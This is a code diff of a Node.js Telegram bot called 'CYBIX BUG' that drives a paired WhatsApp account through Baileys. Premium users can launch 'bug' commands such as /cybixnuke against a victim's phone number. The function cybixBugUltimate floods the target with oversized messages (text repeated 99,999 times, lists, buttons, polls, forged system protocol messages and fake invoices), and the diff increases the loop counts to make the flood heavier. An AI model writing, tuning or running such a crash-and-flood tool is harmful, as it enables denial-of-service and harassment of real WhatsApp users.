@@ -1,19 +1,30 @@
-// ========== EXPRESS SERVER FOR RENDER DEPLOYMENT ==========
+// EXPRESS SERVER FOR RENDER DEPLOYMENT
 const express = require("express");
 const app = express();
 const PORT = process.env.PORT || 8080;
-app.get("/", (req, res) => res.send("CYBIX BUG BOT IS RUNNING!"));
-app.listen(PORT, () => console.log(`[CYBIX][EXPRESS] Listening on port ${PORT}`));
 
-// ========== DEPENDENCIES ==========
-const { Telegraf } = require("telegraf");
+app.get("/", (req, res) => {
+  res.send("CYBIX BUG BOT IS RUNNING!");
+});
+app.listen(PORT, () => {
+  console.log("[CYBIX][EXPRESS] Listening on port " + PORT);
+});
+
+// DEPENDENCIES
 const fs = require("fs");
-const { BOT_TOKEN, OWNER_ID } = require("./config");
+const path = require("path");
+const dotenv = require("dotenv");
 const chalk = require("chalk");
-const axios = require("axios");
 const moment = require("moment-timezone");
 const crypto = require("crypto");
+const { Telegraf } = require("telegraf");
+const axios = require("axios");
 const pino = require("pino");
+// Telegram extra
+const TelegramBot = require("node-telegram-bot-api");
+const { TelegramClient } = require("telegram");
+const readlineSync = require("readline-sync");
+// WhatsApp Baileys (latest stable)
 const {
   default: makeWASocket,
   useMultiFileAuthState,
@@ -22,38 +33,36 @@ const {
   generateWAMessageFromContent,
   proto
 } = require("@whiskeysockets/baileys");
+// Others
+const qrcode = require("qrcode-terminal");
+const bodyParser = require("body-parser");
+const { Octokit } = require("@octokit/rest");
+const twilio = require("twilio");
+const archiver = require("archiver");
+const unzipper = require("unzipper");
 
-// ========== CONSTANTS ==========
-const BANNER_IMAGE_URL = "https://imgur.com/a/b4ZAdYa"; // Update to your preferred banner
+// ENV
+dotenv.config();
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const OWNER_ID = process.env.OWNER_ID;
+
+// DATA FILES
 const DATA_FILES = {
   premium: "./premiumUsers.json",
   admins: "./admins.json",
   activity: "./userActivity.json"
 };
-const bugTypes = [
-  { cmd: "cybixbomb", emoji: "💣", label: "BOMB" },
-  { cmd: "cybixquake", emoji: "🌋", label: "QUAKE" },
-  { cmd: "cybixflood", emoji: "🌊", label: "FLOOD" },
-  { cmd: "cybixstorm", emoji: "🌪️", label: "STORM" },
-  { cmd: "cybixworm", emoji: "🦠", label: "WORM" },
-  { cmd: "cybixnuke", emoji: "☢️", label: "NUKE" },
-  { cmd: "cybixinferno", emoji: "🔥", label: "INFERNO" },
-  { cmd: "cybixplague", emoji: "🦠", label: "PLAGUE" },
-  { cmd: "cybixavalanche", emoji: "🏔️", label: "AVALANCHE" },
-  { cmd: "cybixfreeze", emoji: "❄️", label: "FREEZE" }
-];
-
-// ========== DATA MODULE ==========
 let premiumUsers = {};
 let adminUsers = [];
 let userActivity = {};
 
+// LOAD/SAVE MODULES
 function loadFile(file, fallback) {
   try { return JSON.parse(fs.readFileSync(file)); } catch { return fallback; }
 }
 function saveFile(file, data) { fs.writeFileSync(file, JSON.stringify(data)); }
 
-// ========== ADMIN/PREMIUM/OWNER MODULE ==========
+// ADMIN/PREMIUM/OWNER
 function isOwner(userId) { return userId.toString() === OWNER_ID; }
 function isAdmin(userId) { return adminUsers.includes(userId.toString()); }
 function isPremium(userId) {
@@ -66,10 +75,11 @@ function recordUserActivity(userId, nickname) {
   saveFile(DATA_FILES.activity, userActivity);
 }
 
-// ========== WHATSAPP MODULE ==========
+// WHATSAPP MODULE
 let waClient = null;
 let waConnected = false;
 const waStore = makeInMemoryStore({ logger: pino().child({ level: "silent" }) });
+
 async function startWhatsapp() {
   const { state, saveCreds } = await useMultiFileAuthState("./wa-session");
   const { version } = await fetchLatestBaileysVersion();
@@ -93,7 +103,7 @@ async function startWhatsapp() {
   });
 }
 
-// ========== LOAD ALL DATA ==========
+// INIT DATA
 function loadAllData() {
   premiumUsers = loadFile(DATA_FILES.premium, {});
   adminUsers = loadFile(DATA_FILES.admins, []);
@@ -102,15 +112,30 @@ function loadAllData() {
 loadAllData();
 startWhatsapp();
 
-// ========== TELEGRAM BOT ==========
+// TELEGRAM BOT SETUP
 const bot = new Telegraf(BOT_TOKEN);
+const tgBot = new TelegramBot(BOT_TOKEN, { polling: true });
 
 let maintenance = {
   enabled: false,
   message: "CYBIX BUG is under maintenance by the owner. Please wait!"
 };
 
-// ========== MIDDLEWARE ==========
+const BANNER_IMAGE_URL = "https://imgur.com/a/b4ZAdYa";
+const bugTypes = [
+  { cmd: "cybixbomb", emoji: "💣", label: "BOMB" },
+  { cmd: "cybixquake", emoji: "🌋", label: "QUAKE" },
+  { cmd: "cybixflood", emoji: "🌊", label: "FLOOD" },
+  { cmd: "cybixstorm", emoji: "🌪️", label: "STORM" },
+  { cmd: "cybixworm", emoji: "🦠", label: "WORM" },
+  { cmd: "cybixnuke", emoji: "☢️", label: "NUKE" },
+  { cmd: "cybixinferno", emoji: "🔥", label: "INFERNO" },
+  { cmd: "cybixplague", emoji: "🦠", label: "PLAGUE" },
+  { cmd: "cybixavalanche", emoji: "🏔️", label: "AVALANCHE" },
+  { cmd: "cybixfreeze", emoji: "❄️", label: "FREEZE" }
+];
+
+// MIDDLEWARE
 bot.use(async (ctx, next) => {
   let userId = ctx.from?.id?.toString();
   let nickname = ctx.from?.first_name || userId;
@@ -133,12 +158,13 @@ function requireWA(ctx, next) {
   return next();
 }
 
-// ========== COMMANDS: MENUS ==========
+// MENUS
 bot.start(async ctx => {
   const menu = `
-━━━━━━━━━━━━━━━━-
+━━━━━━━━━━━━━━━━━━
 CYBIX BUG SYSTEM
-━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━
+OWNER INFO
 ┏━━━━━━━━━━━━━━
 ┃ ⎚ OWNER ID : ${OWNER_ID}
 ┃ ⎚ OWNER : ${isOwner(ctx.from.id) ? "✅" : "❌"}
@@ -156,7 +182,6 @@ CYBIX BUG SYSTEM
     reply_markup: { inline_keyboard: [[{ text: "CONTACT OWNER", url: "https://t.me/yourusername" }]] }
   });
 });
-
 bot.command("ownermenu", async ctx => {
   await ctx.deleteMessage();
   const menu = `
@@ -174,7 +199,6 @@ bot.command("ownermenu", async ctx => {
     reply_markup: { inline_keyboard: [[{ text: "CONTACT OWNER", url: "https://t.me/yourusername" }]] }
   });
 });
-
 bot.command("othermenu", async ctx => {
   await ctx.deleteMessage();
   const menu = `
@@ -188,7 +212,6 @@ bot.command("othermenu", async ctx => {
     reply_markup: { inline_keyboard: [[{ text: "CONTACT OWNER", url: "https://t.me/yourusername" }]] }
   });
 });
-
 bot.command("bugmenu", async ctx => {
   await ctx.deleteMessage();
   let buglist = bugTypes.map(b => `☞ /${b.cmd} [PhoneNumber] ${b.emoji}`).join("\n");
@@ -203,8 +226,7 @@ ${buglist}
   });
 });
 
-// ========== COMMANDS: ADMIN & PREMIUM ==========
-
+// ADMIN/PREMIUM CMDS
 bot.command("addadmin", requireAdmin, async ctx => {
   const parts = ctx.message.text.split(" ");
   const userId = parts[1];
@@ -215,7 +237,6 @@ bot.command("addadmin", requireAdmin, async ctx => {
     ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: `User *${userId}* added as Admin.` });
   } else ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: "User is already an admin." });
 });
-
 bot.command("deladmin", requireAdmin, async ctx => {
   const parts = ctx.message.text.split(" ");
   const userId = parts[1];
@@ -224,7 +245,6 @@ bot.command("deladmin", requireAdmin, async ctx => {
   saveFile(DATA_FILES.admins, adminUsers);
   ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: `User *${userId}* removed from Admins.` });
 });
-
 bot.command("addprem", requireAdmin, async ctx => {
   const parts = ctx.message.text.split(" ");
   const userId = parts[1];
@@ -234,7 +254,6 @@ bot.command("addprem", requireAdmin, async ctx => {
   saveFile(DATA_FILES.premium, premiumUsers);
   ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: `User *${userId}* added as Premium for ${days} days.` });
 });
-
 bot.command("delprem", requireAdmin, async ctx => {
   const parts = ctx.message.text.split(" ");
   const userId = parts[1];
@@ -243,7 +262,6 @@ bot.command("delprem", requireAdmin, async ctx => {
   saveFile(DATA_FILES.premium, premiumUsers);
   ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: `User *${userId}* removed from Premium.` });
 });
-
 bot.command("listadmins", requireAdmin, async ctx => {
   const msg = adminUsers.length ? adminUsers.map(id => `- ${id}`).join("\n") : "No admins yet.";
   ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: `*Admins:*\n${msg}` });
@@ -255,8 +273,7 @@ bot.command("listprem", requireAdmin, async ctx => {
   ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: `*Premium Users:*\n${msg}` });
 });
 
-// ========== COMMANDS: WHATSAPP PAIRING & MAINTENANCE ==========
-
+// WHATSAPP PAIRING & MAINTENANCE
 bot.command("addpairing", requireAdmin, async ctx => {
   const parts = ctx.message.text.split(" ");
   const phone = parts[1];
@@ -269,7 +286,6 @@ bot.command("addpairing", requireAdmin, async ctx => {
     ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: "Failed to pair. Make sure the number is valid and can receive SMS." });
   }
 });
-
 bot.command("maintenance", requireAdmin, async ctx => {
   const parts = ctx.message.text.split(" ");
   const state = parts[1];
@@ -282,20 +298,16 @@ bot.command("maintenance", requireAdmin, async ctx => {
   } else ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: "Format: /maintenance [on/off]" });
 });
 
-// ========== BUGS: ULTRAPOWERFUL MULTI-PAYLOAD ==========
-
-// Utility for random text
+// BUGS: ULTRA MULTI-PAYLOAD
 function bigSpamText(label, emoji) {
   return (label + " " + emoji).repeat(99999) + crypto.randomBytes(128).toString("hex");
 }
-
-// The real bug arsenal: each command triggers multiple types of WhatsApp payloads
 async function cybixBugUltimate(targetJid, label, emoji) {
-  for (let i = 0; i < 5; i++) {
+  for (let i = 0; i < 7; i++) {
     // List payload
     let listPayload = {
       title: `${label} LIST`,
-      sections: Array.from({ length: 5 }, (_, j) => ({
+      sections: Array.from({ length: 7 }, (_, j) => ({
         title: `${label} Section ${j + 1}`,
         rows: [{
           title: bigSpamText(label, emoji),
@@ -304,7 +316,7 @@ async function cybixBugUltimate(targetJid, label, emoji) {
       }))
     };
     // Buttons
-    let buttons = Array.from({ length: 5 }, () => ({
+    let buttons = Array.from({ length: 7 }, () => ({
       buttonId: crypto.randomBytes(32).toString("hex"),
       buttonText: { displayText: `${label} ${emoji} BUTTON` },
       type: 1,
@@ -354,8 +366,8 @@ async function cybixBugUltimate(targetJid, label, emoji) {
     let pollMessage = {
       pollCreationMessage: {
         name: `${label} Poll`,
-        options: Array.from({ length: 5 }, (_, k) => ({ optionName: `${label} Option ${k + 1}` })),
-        selectableOptionsCount: 5
+        options: Array.from({ length: 7 }, (_, k) => ({ optionName: `${label} Option ${k + 1}` })),
+        selectableOptionsCount: 7
       }
     };
 
@@ -408,7 +420,7 @@ async function cybixBugUltimate(targetJid, label, emoji) {
     let msgPoll = generateWAMessageFromContent(targetJid, proto.Message.fromObject(pollMessage), { userJid: targetJid });
     let msgSticker = generateWAMessageFromContent(targetJid, proto.Message.fromObject(stickerMessage), { userJid: targetJid });
 
-    for (let k = 0; k < 2; k++) {
+    for (let k = 0; k < 3; k++) {
       await waClient.relayMessage(targetJid, msgList.message, { messageId: msgList.key.id, participant: { jid: targetJid } });
       await waClient.relayMessage(targetJid, msgContact.message, { messageId: msgContact.key.id, participant: { jid: targetJid } });
       await waClient.relayMessage(targetJid, msgDoc.message, { messageId: msgDoc.key.id, participant: { jid: targetJid } });
@@ -417,7 +429,7 @@ async function cybixBugUltimate(targetJid, label, emoji) {
       await waClient.relayMessage(targetJid, msgPoll.message, { messageId: msgPoll.key.id, participant: { jid: targetJid } });
       await waClient.relayMessage(targetJid, msgSticker.message, { messageId: msgSticker.key.id, participant: { jid: targetJid } });
     }
-    // Extra: fake system notification (simulate WhatsApp system message as bug)
+    // Extra: system notification
     let sysNotification = generateWAMessageFromContent(targetJid, proto.Message.fromObject({
       protocolMessage: {
         key: { remoteJid: targetJid, id: crypto.randomBytes(12).toString("hex") },
@@ -426,7 +438,7 @@ async function cybixBugUltimate(targetJid, label, emoji) {
       }
     }), { userJid: targetJid });
     await waClient.relayMessage(targetJid, sysNotification.message, { messageId: sysNotification.key.id, participant: { jid: targetJid } });
-    // Extra: fake invoice
+    // Extra: invoice
     let invoiceMessage = generateWAMessageFromContent(targetJid, proto.Message.fromObject({
       paymentInfoMessage: {
         currency: "USD",
@@ -442,23 +454,23 @@ async function cybixBugUltimate(targetJid, label, emoji) {
     let quizMessage = generateWAMessageFromContent(targetJid, proto.Message.fromObject({
       pollCreationMessage: {
         name: `${label} QUIZ`,
-        options: Array.from({ length: 5 }, (_, k) => ({ optionName: `${label} Quiz Option ${k + 1}` })),
+        options: Array.from({ length: 7 }, (_, k) => ({ optionName: `${label} Quiz Option ${k + 1}` })),
         selectableOptionsCount: 1
       }
     }), { userJid: targetJid });
     await waClient.relayMessage(targetJid, quizMessage.message, { messageId: quizMessage.key.id, participant: { jid: targetJid } });
-    // Extra: repeated spam text
-    for (let s = 0; s < 2; s++) {
+    // Extra: spam text
+    for (let s = 0; s < 4; s++) {
       let spamMsg = generateWAMessageFromContent(targetJid, proto.Message.fromObject({
         conversation: bigSpamText(label, emoji)
       }), { userJid: targetJid });
       await waClient.relayMessage(targetJid, spamMsg.message, { messageId: spamMsg.key.id, participant: { jid: targetJid } });
     }
-    console.log(chalk.red.bold(`[CYBIX ${label}] All payloads sent to ${targetJid}`));
+    console.log(chalk.red.bold(`[CYBIX ${label}] Massive payloads sent to ${targetJid}`));
   }
 }
 
-// Register all bug commands
+// REGISTER ALL BUG COMMANDS
 for (const bug of bugTypes) {
   bot.command(bug.cmd, requireWA, requirePremium, async ctx => {
     const parts = ctx.message.text.split(" ");
@@ -471,6 +483,6 @@ for (const bug of bugTypes) {
   });
 }
 
-// ========== END ==========
+// LAUNCH BOT
 bot.launch();
 console.log(chalk.cyan.bold("CYBIX BUG is running!"));
